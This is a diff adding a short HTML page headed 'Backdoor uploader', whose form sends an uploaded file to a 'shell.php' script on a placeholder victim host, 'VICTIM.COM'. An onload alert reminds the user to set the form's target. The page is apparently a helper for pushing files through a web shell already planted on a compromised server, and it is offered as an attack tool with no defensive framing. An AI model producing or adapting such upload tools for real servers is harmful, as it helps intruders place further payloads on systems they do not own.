@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+	<head>
+		<title>Uploader</title>
+	</head>
+	<body onload = "alert('Hello!\nCheck the action in the forms!')">
+		<h4>Backdoor uploader</h4>
+		<form method = "post" action = "http://VICTIM.COM/shell.php" enctype = "multipart/form-data">
+			<input type = "file" name = "uploadfile" required />
+			<input type = "hidden" name = "hello" value = "world"/>
+			<input type = "submit" value = "Upload" />
+		</form>
+	</body>
+</html>
